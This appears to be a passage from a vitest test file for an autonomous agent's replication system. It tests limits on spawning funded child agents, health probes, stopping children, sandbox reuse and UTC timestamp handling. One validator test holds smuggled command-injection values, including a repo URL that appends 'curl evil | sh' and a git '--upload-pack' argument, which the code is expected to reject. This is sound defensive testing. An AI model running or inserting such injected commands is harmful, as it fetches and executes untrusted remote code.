/**
 * Child bookkeeping: spawn limits, liveness probes, stopping children,
 * sandbox reuse, the colony health report, pool optimizer, timestamps and
 * the parent's goal/task tools.
 *
 * The file runs east of UTC so that a local-time parse of SQLite's
 * zone-less UTC timestamps shows up as a one-hour error.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import BetterSqlite3 from "better-sqlite3";
import fs from "node:fs";
import os from "node:os";
import nodePath from "node:path";

vi.hoisted(() => {
  process.env.TZ = "Europe/Berlin";
});

import { CHILD_CONFIG_PATH, DEFAULT_CHILD_RUNTIME_REPO, spawnChild } from "../replication/spawn.js";
import { ChildLifecycle, stopChild } from "../replication/lifecycle.js";
import { ChildHealthMonitor, CHILD_PROBE_COMMAND } from "../replication/health.js";
import { SandboxCleanup } from "../replication/cleanup.js";
import { holdsSlot, parseDbTimestamp } from "../replication/child-status.js";
import { HealthMonitor } from "../orchestration/health-monitor.js";
import { SimpleFundingProtocol } from "../orchestration/simple-tracker.js";
import { BUILTIN_TASKS } from "../heartbeat/tasks.js";
import { createBuiltinTools } from "../agent/tools.js";
import { getOrchestratorStatus } from "../agent/system-prompt.js";
import { loadHeartbeatConfig } from "../heartbeat/config.js";
import { getLineageSummary, pruneDeadChildren } from "../replication/lineage.js";
import { createGoal } from "../orchestration/task-graph.js";
import { insertTask } from "../state/database.js";
import {
  MockConwayClient,
  MockInferenceClient,
  createTestConfig,
  createTestDb,
  createTestIdentity,
} from "./mocks.js";
import type {
  AutomatonConfig,
  AutomatonDatabase,
  ConwayClient,
  CreateSandboxOptions,
  ExecResult,
  GenesisConfig,
  SandboxInfo,
  ToolContext,
} from "../types.js";

// ─── Fakes ──────────────────────────────────────────────────────

type Answer = (sandboxId: string, command: string) => ExecResult | Promise<ExecResult>;

/** Conway fake whose scoped clients answer per sandbox and log every call. */
class FakeConway extends MockConwayClient {
  log: Array<{ sandbox: string; kind: "exec" | "write"; command: string }> = [];
  scopedIds: string[] = [];
  created: CreateSandboxOptions[] = [];
  sandboxes: SandboxInfo[] = [];
  private nextSandbox = 1;

  constructor(public answer: Answer = defaultAnswer) {
    super();
  }

  async exec(command: string, timeout?: number): Promise<ExecResult> {
    this.execCalls.push({ command, timeout });
    this.log.push({ sandbox: "parent", kind: "exec", command });
    return this.answer("parent", command);
  }

  async createSandbox(options: CreateSandboxOptions): Promise<SandboxInfo> {
    this.created.push(options);
    const info: SandboxInfo = {
      id: `new-sbx-${this.nextSandbox++}`,
      status: "running",
      region: "us-east",
      vcpu: options.vcpu ?? 1,
      memoryMb: options.memoryMb ?? 1024,
      diskGb: options.diskGb ?? 10,
      createdAt: new Date().toISOString(),
    };
    this.sandboxes.push(info);
    return info;
  }

  async listSandboxes(): Promise<SandboxInfo[]> {
    return this.sandboxes;
  }

  createScopedClient(sandboxId: string): ConwayClient {
    this.scopedIds.push(sandboxId);
    const outer = this;
    const scoped = Object.create(this) as FakeConway;
    scoped.exec = async (command: string) => {
      outer.log.push({ sandbox: sandboxId, kind: "exec", command });
      return outer.answer(sandboxId, command);
    };
    scoped.writeFile = async (path: string, content: string) => {
      outer.log.push({ sandbox: sandboxId, kind: "write", command: path });
      outer.files[`${sandboxId}:${path}`] = content;
    };
    return scoped;
  }
}

let walletCounter = 0;
function nextWallet(): string {
  walletCounter += 1;
  return `0x${walletCounter.toString(16).padStart(40, "0")}`;
}

function ok(stdout = "ok"): ExecResult {
  return { stdout, stderr: "", exitCode: 0 };
}

function defaultAnswer(_sandbox: string, command: string): ExecResult {
  if (command.includes("--init")) return ok(`Wallet: ${nextWallet()}`);
  if (command.includes("pgrep") && command.includes("busy")) return ok("idle");
  if (command === CHILD_PROBE_COMMAND) return ok('{"status":"running"}');
  return ok();
}

function sandboxInfo(id: string, status = "running"): SandboxInfo {
  return { id, status, region: "x", vcpu: 1, memoryMb: 1024, diskGb: 10, createdAt: new Date().toISOString() };
}

const identity = createTestIdentity();

function genesis(name: string): GenesisConfig {
  return { name, genesisPrompt: "Own mission", creatorAddress: identity.address, parentAddress: identity.address };
}

/** A lifecycle child walked to `upTo`, with a wallet and a sandbox. */
function makeChild(
  db: AutomatonDatabase,
  id: string,
  upTo: "requested" | "wallet_verified" | "funded" | "starting" | "healthy" | "unhealthy" | "stopped" | "failed",
  sandboxId = `sbx-${id}`,
): ChildLifecycle {
  const lifecycle = new ChildLifecycle(db.raw);
  lifecycle.initChild(id, id, sandboxId, "genesis");
  db.raw.prepare("UPDATE children SET address = ? WHERE id = ?").run(nextWallet(), id);
  const path = ["sandbox_created", "runtime_ready", "wallet_verified", "funded", "starting", "healthy"] as const;
  if (upTo === "requested") return lifecycle;
  if (upTo === "failed") {
    lifecycle.transition(id, "failed", "test");
    return lifecycle;
  }
  for (const s of path) {
    lifecycle.transition(id, s);
    if (s === upTo) return lifecycle;
  }
  if (upTo === "unhealthy") lifecycle.transition(id, "unhealthy");
  if (upTo === "stopped") lifecycle.transition(id, "stopped");
  return lifecycle;
}

/** Back-date every lifecycle event of a child. */
function ageEvents(db: AutomatonDatabase, id: string, minutes: number): void {
  db.raw
    .prepare("UPDATE child_lifecycle_events SET created_at = ? WHERE child_id = ?")
    .run(new Date(Date.now() - minutes * 60_000).toISOString(), id);
}

function state(db: AutomatonDatabase, id: string): string {
  return new ChildLifecycle(db.raw).getCurrentState(id);
}

function toolCtx(db: AutomatonDatabase, conway: ConwayClient, config: Partial<AutomatonConfig> = {}): ToolContext {
  return {
    identity,
    config: createTestConfig(config),
    db,
    conway,
    inference: new MockInferenceClient(),
  } as ToolContext;
}

async function runTool(name: string, args: Record<string, unknown>, ctx: ToolContext): Promise<string> {
  const tool = createBuiltinTools("test-sandbox").find((t) => t.name === name);
  if (!tool) throw new Error(`no tool ${name}`);
  return tool.execute(args, ctx);
}

function heartbeatCtx(db: AutomatonDatabase, conway: ConwayClient, config: Partial<AutomatonConfig> = {}) {
  return { identity, config: createTestConfig(config), db, conway } as any;
}

let db: AutomatonDatabase;

beforeEach(() => {
  db = createTestDb();
});

afterEach(() => {
  db.close();
  vi.restoreAllMocks();
});

// ─── F175: configured limits ───────────────────────────────────

describe("spawnChild honours the operator's limits (F175)", () => {
  it("refuses the second spawn at maxChildren 1 and buys one sandbox", async () => {
    const conway = new FakeConway();
    await spawnChild(conway, identity, db, genesis("one"), new ChildLifecycle(db.raw), { maxChildren: 1 });

    await expect(
      spawnChild(conway, identity, db, genesis("two"), new ChildLifecycle(db.raw), { maxChildren: 1 }),
    ).rejects.toThrow(/max children \(1\/1\)/);
    expect(conway.created).toHaveLength(1);
    expect(db.getChildren()).toHaveLength(1);
  });

  it("uses childSandboxMemoryMb for the sandbox tier", async () => {
    const conway = new FakeConway();
    await spawnChild(conway, identity, db, genesis("big"), new ChildLifecycle(db.raw), {
      maxChildren: 3,
      childSandboxMemoryMb: 4096,
    });
    expect(conway.created[0]).toMatchObject({ memoryMb: 4096, vcpu: 2, diskGb: 40 });
  });

  it("maxChildren 0 disables spawning before anything is bought", async () => {
    const conway = new FakeConway();
    await expect(
      spawnChild(conway, identity, db, genesis("none"), new ChildLifecycle(db.raw), { maxChildren: 0 }),
    ).rejects.toThrow(/replication disabled/);
    expect(conway.created).toHaveLength(0);

    const out = await runTool("spawn_child", { name: "none" }, toolCtx(db, conway, { maxChildren: 0 }));
    expect(out).toMatch(/disabled/);
    expect(conway.created).toHaveLength(0);
  });

  it("spawn_child passes the configured limit", async () => {
    const conway = new FakeConway();
    makeChild(db, "existing", "healthy");
    await expect(runTool("spawn_child", { name: "second" }, toolCtx(db, conway, { maxChildren: 1 }))).rejects.toThrow(
      /max children/,
    );
    expect(conway.created).toHaveLength(0);
  });

  it("takes the last slot only once when two spawns in one process race", async () => {
    const conway = new FakeConway();
    const results = await Promise.allSettled([
      spawnChild(conway, identity, db, genesis("a"), new ChildLifecycle(db.raw), { maxChildren: 1 }),
      spawnChild(conway, identity, db, genesis("b"), new ChildLifecycle(db.raw), { maxChildren: 1 }),
    ]);
    expect(results.filter((r) => r.status === "fulfilled")).toHaveLength(1);
    expect(conway.created).toHaveLength(1);
  });

  it("counts slots and inserts the row in one write transaction (a second connection cannot take the slot in between)", async () => {
    const conway = new FakeConway();
    // Another process (a second connection to the same file) that fails at once on a lock.
    const other = new BetterSqlite3(db.raw.name, { timeout: 0 });
    let otherError: unknown = null;
    const rival = () => {
      try {
        other.prepare(
          `INSERT INTO children (id, name, address, sandbox_id, genesis_prompt, status) VALUES ('rival', 'rival', '', '', 'p', 'requested')`,
        ).run();
      } catch (error) {
        otherError = error;
      }
    };
    // The rival tries to take the slot right after this spawn counted it free.
    const prepare = db.raw.prepare.bind(db.raw);
    vi.spyOn(db.raw, "prepare").mockImplementation(((sql: string) => {
      const stmt = prepare(sql);
      if (sql !== "SELECT status FROM children") return stmt;
      return new Proxy(stmt, {
        get(target, prop) {
          if (prop === "all") {
            return (...args: unknown[]) => {
              const rows = (target.all as (...a: unknown[]) => unknown[])(...args);
              rival();
              return rows;
            };
          }
          const value = Reflect.get(target, prop);
          return typeof value === "function" ? value.bind(target) : value;
        },
      });
    }) as typeof db.raw.prepare);
    try {
      await spawnChild(conway, identity, db, genesis("a"), new ChildLifecycle(db.raw), { maxChildren: 1 });
    } finally {
      vi.mocked(db.raw.prepare).mockRestore();
      other.close();
    }
    expect(String((otherError as { code?: string } | null)?.code)).toMatch(/SQLITE_BUSY/);
    expect(db.getChildren().map((c) => c.name)).toEqual(["a"]);
  });

  it("counts only slot-holding states: stopped, failed, cleaned_up and dead do not", async () => {
    makeChild(db, "s", "stopped");
    makeChild(db, "f", "failed");
    expect(["stopped", "failed", "cleaned_up", "dead"].some(holdsSlot)).toBe(false);
    expect(["requested", "wallet_verified", "funded", "starting", "healthy", "unhealthy", "running"].every(holdsSlot)).toBe(true);

    const conway = new FakeConway();
    const child = await spawnChild(conway, identity, db, genesis("fresh"), new ChildLifecycle(db.raw), { maxChildren: 1 });
    expect(child.status).toBe("wallet_verified");
  });

  it("fails a spawn row abandoned for 30 minutes instead of holding its slot forever", async () => {
    makeChild(db, "orphan", "requested");
    ageEvents(db, "orphan", 31);

    const conway = new FakeConway();
    await spawnChild(conway, identity, db, genesis("next"), new ChildLifecycle(db.raw), { maxChildren: 1 });

    expect(state(db, "orphan")).toBe("failed");
  });
});

// ─── F177: the child probe ─────────────────────────────────────

describe("ChildHealthMonitor probes the child's own sandbox (F177)", () => {
  it("runs pgrep in the child sandbox and keeps a running child healthy", async () => {
    makeChild(db, "kid", "healthy", "child-sbx-1");
    const conway = new FakeConway();
    const monitor = new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw));

    const [result] = await monitor.checkAllChildren();

    expect(conway.scopedIds).toContain("child-sbx-1");
    expect(conway.log.filter((l) => l.sandbox === "parent")).toEqual([]);
    expect(conway.log.find((l) => l.sandbox === "child-sbx-1")?.command).toContain("pgrep -f '[i]ndex.js --run'");
    expect(result).toMatchObject({ healthy: true, probe: "running", state: "healthy" });
    expect(state(db, "kid")).toBe("healthy");
  });

  it("offline -> unhealthy, and failed once unhealthy for 30 minutes", async () => {
    makeChild(db, "kid", "healthy", "child-sbx-1");
    const conway = new FakeConway(() => ok('{"status":"offline"}'));
    let now = Date.now();
    const monitor = new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw), undefined, () => now);

    await monitor.checkAllChildren();
    expect(state(db, "kid")).toBe("unhealthy");

    now += 10 * 60_000;
    await monitor.checkAllChildren();
    expect(state(db, "kid")).toBe("unhealthy");

    now += 21 * 60_000;
    await monitor.checkAllChildren();
    expect(state(db, "kid")).toBe("failed");
    // A failed child holds no slot and is never probed or revived again.
    conway.answer = () => ok('{"status":"running"}');
    expect(await monitor.checkAllChildren()).toEqual([]);
    expect(state(db, "kid")).toBe("failed");
  });

  it("an API error with the sandbox still running changes nothing (an outage must not fail children)", async () => {
    makeChild(db, "kid", "unhealthy", "child-sbx-1");
    ageEvents(db, "kid", 120);
    const conway = new FakeConway(() => {
      throw new Error("Conway API 503");
    });
    conway.sandboxes = [sandboxInfo("child-sbx-1")];
    const monitor = new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw));

    const [result] = await monitor.checkAllChildren();

    expect(result.probe).toBe("unknown");
    expect(state(db, "kid")).toBe("unhealthy");
  });

  it("a sandbox missing from the listing counts as offline", async () => {
    makeChild(db, "kid", "unhealthy", "child-sbx-1");
    ageEvents(db, "kid", 40);
    const conway = new FakeConway(() => {
      throw new Error("sandbox not found");
    });
    conway.sandboxes = [sandboxInfo("someone-else")];
    const monitor = new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw));

    await monitor.checkAllChildren();

    expect(state(db, "kid")).toBe("failed");
  });

  it("a child stuck in starting: healthy when the process is seen, failed when it never came up", async () => {
    makeChild(db, "up", "starting", "sbx-up");
    makeChild(db, "down", "starting", "sbx-down");
    ageEvents(db, "down", 11);
    const conway = new FakeConway((sandbox) => ok(sandbox === "sbx-up" ? '{"status":"running"}' : '{"status":"offline"}'));
    const monitor = new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw));

    await monitor.checkAllChildren();

    expect(state(db, "up")).toBe("healthy");
    expect(state(db, "down")).toBe("failed");
  });

  it("check_child_health wakes the agent only when something changes", async () => {
    makeChild(db, "kid", "healthy", "child-sbx-1");
    const conway = new FakeConway(() => ok('{"status":"offline"}'));
    const ctx = heartbeatCtx(db, conway);

    const first = await BUILTIN_TASKS.check_child_health({} as any, ctx);
    const second = await BUILTIN_TASKS.check_child_health({} as any, ctx);

    expect(first.shouldWake).toBe(true);
    expect(second.shouldWake).toBe(false);
    expect(state(db, "kid")).toBe("unhealthy");
  });
});

// ─── F181 / stop_child ─────────────────────────────────────────

describe("stop_child frees slots (F181)", () => {
  it("stops a healthy child after a verified kill, and the next spawn succeeds", async () => {
    makeChild(db, "kid", "healthy", "sbx-kid");
    const conway = new FakeConway((sandbox, command) =>
      command.includes("pkill") ? ok("stopped") : defaultAnswer(sandbox, command),
    );

    const out = await runTool("stop_child", { child_id: "kid", reason: "done" }, toolCtx(db, conway, { maxChildren: 1 }));

    expect(out).toMatch(/stopped/);
    expect(conway.log.find((l) => l.command.includes("pkill"))?.sandbox).toBe("sbx-kid");
    expect(state(db, "kid")).toBe("stopped");
    await expect(
      spawnChild(conway, identity, db, genesis("next"), new ChildLifecycle(db.raw), { maxChildren: 1 }),
    ).resolves.toMatchObject({ status: "wallet_verified" });
  });

  it("abandons a wallet_verified child without touching its sandbox", async () => {
    makeChild(db, "kid", "wallet_verified");
    const conway = new FakeConway();

    const out = await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway));

    expect(out).toMatch(/abandoned/);
    expect(state(db, "kid")).toBe("failed");
    expect(conway.log).toEqual([]);
  });

  it("leaves the child healthy when the process survives the kill", async () => {
    makeChild(db, "kid", "healthy");
    const conway = new FakeConway(() => ok("alive"));

    const out = await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway));

    expect(out).toMatch(/Could not stop/);
    expect(state(db, "kid")).toBe("healthy");
  });

  it("leaves the child alone when the stop cannot be verified", async () => {
    makeChild(db, "kid", "healthy", "sbx-kid");
    const conway = new FakeConway(() => {
      throw new Error("Conway API 503");
    });
    conway.sandboxes = [sandboxInfo("sbx-kid")];

    expect(await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway))).toMatch(/Could not stop/);
    expect(state(db, "kid")).toBe("healthy");
  });

  it("a child stuck in starting can be stopped (to failed)", async () => {
    makeChild(db, "kid", "starting");
    const conway = new FakeConway(() => ok("stopped"));

    await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway));

    expect(state(db, "kid")).toBe("failed");
  });

  it("refuses a spawn in progress but abandons one stuck for 15 minutes", async () => {
    makeChild(db, "kid", "requested");
    const conway = new FakeConway();
    expect(await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway))).toMatch(/still being spawned/);
    expect(state(db, "kid")).toBe("requested");

    ageEvents(db, "kid", 16);
    await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway));
    expect(state(db, "kid")).toBe("failed");
  });

  it("frees a legacy row with no lifecycle events after a verified kill", async () => {
    db.insertChild({
      id: "legacy",
      name: "legacy",
      address: nextWallet() as `0x${string}`,
      sandboxId: "sbx-legacy",
      genesisPrompt: "p",
      fundedAmountCents: 0,
      status: "running",
      createdAt: new Date().toISOString(),
    });
    const conway = new FakeConway(() => ok("stopped"));

    await stopChild(db, conway, "legacy", "cleanup");

    expect(db.getChildById("legacy")?.status).toBe("dead");
  });
});

// ─── F187: sandbox reuse ───────────────────────────────────────

describe("sandbox reuse is safe (F187)", () => {
  it("does not reuse a failed child's sandbox while an agent process runs in it", async () => {
    makeChild(db, "old", "failed", "old-sbx");
    const conway = new FakeConway((sandbox, command) =>
      sandbox === "old-sbx" && command.includes("busy") ? ok("busy") : defaultAnswer(sandbox, command),
    );
    conway.sandboxes = [sandboxInfo("old-sbx")];

    const child = await spawnChild(conway, identity, db, genesis("new"), new ChildLifecycle(db.raw), { maxChildren: 3 });

    expect(child.sandboxId).toBe("new-sbx-1");
    expect(conway.created).toHaveLength(1);
    expect(state(db, "old")).toBe("failed");
  });

  it("rotates the previous child's state before writing the new genesis", async () => {
    makeChild(db, "old", "failed", "old-sbx");
    const conway = new FakeConway();
    conway.sandboxes = [sandboxInfo("old-sbx")];

    const child = await spawnChild(conway, identity, db, genesis("new"), new ChildLifecycle(db.raw), { maxChildren: 3 });

    expect(child.sandboxId).toBe("old-sbx");
    expect(conway.created).toHaveLength(0);
    const inOld = conway.log.filter((l) => l.sandbox === "old-sbx");
    const mv = inOld.findIndex((l) => l.command.includes("mv /root/.automaton /root/.automaton.prev-"));
    const clone = inOld.findIndex((l) => l.command.includes("git clone"));
    const genesisWrite = inOld.findIndex((l) => l.kind === "write" && l.command.endsWith("genesis.json"));
    expect(mv).toBeGreaterThanOrEqual(0);
    expect(mv).toBeLessThan(clone);
    expect(mv).toBeLessThan(genesisWrite);
    // The old row is retired through the lifecycle, so both agree.
    expect(state(db, "old")).toBe("cleaned_up");
    expect(db.getChildById("old")?.status).toBe("cleaned_up");
  });

  it("a failed clone (non-zero exit) fails the spawn", async () => {
    const conway = new FakeConway((sandbox, command) =>
      command.includes("git clone") ? { stdout: "", stderr: "fatal: destination path exists", exitCode: 128 } : defaultAnswer(sandbox, command),
    );

    await expect(
      spawnChild(conway, identity, db, genesis("broken"), new ChildLifecycle(db.raw), { maxChildren: 3 }),
    ).rejects.toThrow(/clone and build failed \(exit 128\)/);
    const [row] = db.getChildren();
    expect(state(db, row.id)).toBe("failed");
  });
});

// ─── Spawned children start configured ─────────────────────────

describe("a spawned child can start without a terminal", () => {
  it("clones the configured runtime source and ref, and upstream by default", async () => {
    const custom = new FakeConway();
    await spawnChild(custom, identity, db, genesis("custom"), new ChildLifecycle(db.raw), {
      maxChildren: 3,
      childRuntimeRepo: "https://github.com/example/automaton.git",
      childRuntimeRef: "v1.2",
    });
    expect(custom.log.find((l) => l.command.includes("git clone"))?.command)
      .toContain("git clone --branch v1.2 https://github.com/example/automaton.git /root/automaton");

    const plain = new FakeConway();
    await spawnChild(plain, identity, db, genesis("plain"), new ChildLifecycle(db.raw), { maxChildren: 3 });
    expect(plain.log.find((l) => l.command.includes("git clone"))?.command)
      .toContain(`git clone ${DEFAULT_CHILD_RUNTIME_REPO} /root/automaton`);
  });

  it("refuses a runtime source that is not a plain https URL before anything is bought", async () => {
    const conway = new FakeConway();
    await expect(
      spawnChild(conway, identity, db, genesis("bad"), new ChildLifecycle(db.raw), {
        maxChildren: 3,
        childRuntimeRepo: "https://example.com/a.git; curl evil | sh",
      }),
    ).rejects.toThrow(/childRuntimeRepo/);
    await expect(
      spawnChild(conway, identity, db, genesis("bad"), new ChildLifecycle(db.raw), {
        maxChildren: 3,
        childRuntimeRef: "--upload-pack=x",
      }),
    ).rejects.toThrow(/childRuntimeRef/);
    expect(conway.created).toHaveLength(0);
    expect(db.getChildren()).toHaveLength(0);
  });

  it("without a genesis bootstrap, the child provisions its own key and gets an automaton.json before it can be funded", async () => {
    const conway = new FakeConway();

    const child = await spawnChild(conway, identity, db, genesis("upstream"), new ChildLifecycle(db.raw), { maxChildren: 3 });

    const inChild = conway.log.filter((l) => l.sandbox === child.sandboxId);
    const init = inChild.findIndex((l) => l.command.includes("--init"));
    const provision = inChild.findIndex((l) => l.command.includes("--provision"));
    const configWrite = inChild.findIndex((l) => l.kind === "write" && l.command === CHILD_CONFIG_PATH);
    expect(init).toBeGreaterThanOrEqual(0);
    expect(provision).toBeGreaterThan(init);
    expect(configWrite).toBeGreaterThan(provision);
    // The provisioning output carries the child's API key; it never reaches the parent.
    expect(inChild[provision].command).toContain(">/dev/null 2>&1");

    const config = JSON.parse(conway.files[`${child.sandboxId}:${CHILD_CONFIG_PATH}`]);
    expect(config).toMatchObject({
      name: "upstream",
      genesisPrompt: "Own mission",
      walletAddress: child.address,
      sandboxId: child.sandboxId,
      parentAddress: identity.address,
      creatorAddress: identity.address,
    });
    expect(config).not.toHaveProperty("conwayApiKey");
    expect(state(db, child.id)).toBe("wallet_verified");
  });

  it("with a genesis bootstrap in the checkout, the child builds its own config", async () => {
    const conway = new FakeConway((sandbox, command) =>
      command.includes("genesis-bootstrap.js") ? ok("genesis-bootstrap") : defaultAnswer(sandbox, command),
    );

    const child = await spawnChild(conway, identity, db, genesis("fork"), new ChildLifecycle(db.raw), { maxChildren: 3 });

    expect(conway.log.some((l) => l.command.includes("--provision"))).toBe(false);
    expect(conway.log.some((l) => l.kind === "write" && l.command === CHILD_CONFIG_PATH)).toBe(false);
    expect(conway.log.some((l) => l.kind === "write" && l.command.endsWith("genesis.json"))).toBe(true);
    expect(state(db, child.id)).toBe("wallet_verified");
  });

  it("a failed key provisioning fails the spawn, so the child is never funded", async () => {
    const conway = new FakeConway((sandbox, command) =>
      command.includes("--provision") ? { stdout: "", stderr: "", exitCode: 1 } : defaultAnswer(sandbox, command),
    );

    await expect(
      spawnChild(conway, identity, db, genesis("nokey"), new ChildLifecycle(db.raw), { maxChildren: 3 }),
    ).rejects.toThrow(/child API key provisioning failed/);
    const [row] = db.getChildren();
    expect(state(db, row.id)).toBe("failed");
  });

  it("start_child does not launch a child with no config and no bootstrap", async () => {
    makeChild(db, "kid", "funded", "sbx-kid");
    const conway = new FakeConway((sandbox, command) =>
      command.includes("nohup") ? ok("unconfigured") : defaultAnswer(sandbox, command),
    );

    const out = await runTool("start_child", { child_id: "kid" }, toolCtx(db, conway));

    expect(out).toMatch(/setup wizard/);
    const launch = conway.log.find((l) => l.command.includes("nohup"))!;
    expect(launch.sandbox).toBe("sbx-kid");
    expect(launch.command).toContain("automaton.json");
    expect(launch.command).toContain("genesis-bootstrap.js");
    expect(state(db, "kid")).toBe("failed");
  });
});

describe("children whose process cannot be verified are still manageable", () => {
  it("stop_child kills a process left in a failed child's sandbox and keeps the row failed", async () => {
    makeChild(db, "kid", "failed", "sbx-kid");
    const conway = new FakeConway((sandbox, command) =>
      command.includes("pkill") ? ok("stopped") : defaultAnswer(sandbox, command),
    );

    const out = await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway));

    expect(out).toMatch(/no agent process runs/);
    expect(conway.log.find((l) => l.command.includes("pkill"))?.sandbox).toBe("sbx-kid");
    expect(state(db, "kid")).toBe("failed");
  });

  it("stop_child on a failed child never kills a newer child that reuses its sandbox", async () => {
    makeChild(db, "old", "failed", "shared-sbx");
    makeChild(db, "new", "healthy", "shared-sbx");
    const conway = new FakeConway();

    const out = await runTool("stop_child", { child_id: "old" }, toolCtx(db, conway));

    expect(out).toMatch(/used by another child/);
    expect(conway.log.some((l) => l.command.includes("pkill"))).toBe(false);
    expect(state(db, "new")).toBe("healthy");
  });

  it("force marks an unreachable running child failed, with the forced stop recorded", async () => {
    makeChild(db, "kid", "healthy", "sbx-kid");
    const conway = new FakeConway(() => {
      throw new Error("Conway API 503");
    });
    conway.sandboxes = [sandboxInfo("sbx-kid")];

    expect(await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway))).toMatch(/Use force/);
    expect(state(db, "kid")).toBe("healthy");

    const out = await runTool("stop_child", { child_id: "kid", force: true }, toolCtx(db, conway));
    expect(out).toMatch(/forced stop/);
    expect(state(db, "kid")).toBe("failed");
    const last = new ChildLifecycle(db.raw).getHistory("kid").at(-1);
    expect(last?.reason).toMatch(/forced stop, process not verified/);
  });

  it("force does not override a process seen alive", async () => {
    makeChild(db, "kid", "healthy");
    const conway = new FakeConway(() => ok("alive"));

    await runTool("stop_child", { child_id: "kid", force: true }, toolCtx(db, conway));

    expect(state(db, "kid")).toBe("healthy");
  });

  it("a sandbox the API answers 404 for, with an empty listing, counts as gone for stop_child and the probe", async () => {
    const notFound = () => {
      const err: any = new Error("Conway API error: POST /v1/sandboxes/sbx-gone/exec -> 404: sandbox not found");
      err.status = 404;
      throw err;
    };
    makeChild(db, "stop-me", "healthy", "sbx-gone");
    const conway = new FakeConway(notFound);
    conway.sandboxes = [];

    await runTool("stop_child", { child_id: "stop-me" }, toolCtx(db, conway));
    expect(state(db, "stop-me")).toBe("stopped");

    makeChild(db, "probe-me", "healthy", "sbx-gone-2");
    let now = Date.now();
    const monitor = new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw), {}, () => now);
    await monitor.checkAllChildren();
    expect(state(db, "probe-me")).toBe("unhealthy");
    now += 31 * 60_000;
    await monitor.checkAllChildren();
    expect(state(db, "probe-me")).toBe("failed");
  });

  it("a 404 while the listing shows the sandbox running proves nothing (spurious load-balancer 404)", async () => {
    makeChild(db, "kid", "healthy", "sbx-kid");
    const conway = new FakeConway(() => {
      const err: any = new Error("Conway API error: POST /v1/sandboxes/sbx-kid/exec -> 404: not found");
      err.status = 404;
      throw err;
    });
    conway.sandboxes = [sandboxInfo("sbx-kid")];

    expect(await runTool("stop_child", { child_id: "kid" }, toolCtx(db, conway))).toMatch(/Could not stop/);
    await new ChildHealthMonitor(db.raw, conway, new ChildLifecycle(db.raw)).checkAllChildren();
    expect(state(db, "kid")).toBe("healthy");
  });
});

// ─── F071: colony_health_check on terminal rows ────────────────

describe("colony_health_check never revives or funds ended children (F071)", () => {
  it("dead, cleaned_up and empty-address rows get no transfer, no status change and no message", async () => {
    const conway = new FakeConway();
    const transfer = vi.spyOn(conway, "transferCredits");
    for (const [id, address, status] of [
      ["c-dead", "0x" + "d".repeat(40), "dead"],
      ["c-clean", "0x" + "e".repeat(40), "cleaned_up"],
      ["c-failed", "", "failed"],
    ] as const) {
      db.insertChild({
        id,
        name: id,
        address: address as `0x${string}`,
        sandboxId: `sb-${id}`,
        genesisPrompt: "p",
        fundedAmountCents: 0,
        status,
        createdAt: new Date(Date.now() - 3 * 3600_000).toISOString(),
      });
    }

    const result = await BUILTIN_TASKS.colony_health_check({} as any, heartbeatCtx(db, conway));

    expect(result.shouldWake).toBe(false);
    expect(transfer).not.toHaveBeenCalled();
    expect(db.getChildren().map((c) => [c.id, c.status]).sort()).toEqual([
      ["c-clean", "cleaned_up"],
      ["c-dead", "dead"],
      ["c-failed", "failed"],
    ]);
    const inbox = db.raw.prepare("SELECT COUNT(*) AS n FROM inbox_messages").get() as { n: number };
    expect(inbox.n).toBe(0);
  });

  it("a funding monitor never funds a terminal row even with autoFund on", async () => {
    const conway = new FakeConway();
    const transfer = vi.spyOn(conway, "transferCredits");
    db.insertChild({
      id: "gone",
      name: "gone",
      address: ("0x" + "f".repeat(40)) as `0x${string}`,
      sandboxId: "sb",
      genesisPrompt: "p",
      fundedAmountCents: 0,
      status: "dead",
      createdAt: new Date().toISOString(),
    });
    const monitor = new HealthMonitor(db, new SimpleFundingProtocol(conway, identity, db, "health.fund_child"), {
      autoFund: true,
    });

    expect(await monitor.autoHeal(await monitor.checkAll())).toEqual([]);
    expect(transfer).not.toHaveBeenCalled();
  });
});

// ─── H3-004: pool optimizer ────────────────────────────────────

describe("agent_pool_optimize only reports (H3-004)", () => {
  it("leaves an idle healthy child healthy", async () => {
    makeChild(db, "kid", "healthy");
    db.raw.prepare("UPDATE children SET last_checked = datetime('now', '-3 hours') WHERE id = 'kid'").run();

    const result = await BUILTIN_TASKS.agent_pool_optimize({} as any, heartbeatCtx(db, new FakeConway()));

    expect(result.shouldWake).toBe(false);
    expect(db.getChildById("kid")?.status).toBe("healthy");
    expect(state(db, "kid")).toBe("healthy");
    const report = JSON.parse(db.getKV("last_agent_pool_optimize")!);
    expect(report).toMatchObject({ culled: 0, activeAgents: 1, spawnCapacity: 2 });
  });
});

// ─── H3-005: UTC timestamps on a UTC+1 host ────────────────────

describe("SQLite timestamps are read as UTC (H3-005)", () => {
  it("runs in a zone east of UTC", () => {
    expect(new Date("2026-01-01T12:00:00Z").getTimezoneOffset()).toBe(-60);
  });

  it("parseDbTimestamp reads zone-less values as UTC and keeps ISO values", () => {
    expect(parseDbTimestamp("2026-11-10 11:12:42")).toBe(Date.UTC(2026, 10, 10, 11, 12, 42));
    expect(parseDbTimestamp("2026-11-10T11:12:42.000Z")).toBe(Date.UTC(2026, 10, 10, 11, 12, 42));
    expect(Number.isNaN(parseDbTimestamp(null))).toBe(true);
  });

  it("a child checked two minutes ago is not stale in the colony report", async () => {
    makeChild(db, "kid", "healthy");
    db.raw.prepare("UPDATE children SET last_checked = datetime('now', '-2 minutes'), funded_amount_cents = 500 WHERE id = 'kid'").run();
    const monitor = new HealthMonitor(db, new SimpleFundingProtocol(new FakeConway(), identity, db));

    const report = await monitor.checkAll();

    expect(report.agents[0].issues).toEqual([]);
  });

  it("cleanupStale keeps a failed child checked two minutes ago", async () => {
    const lifecycle = makeChild(db, "kid", "failed");
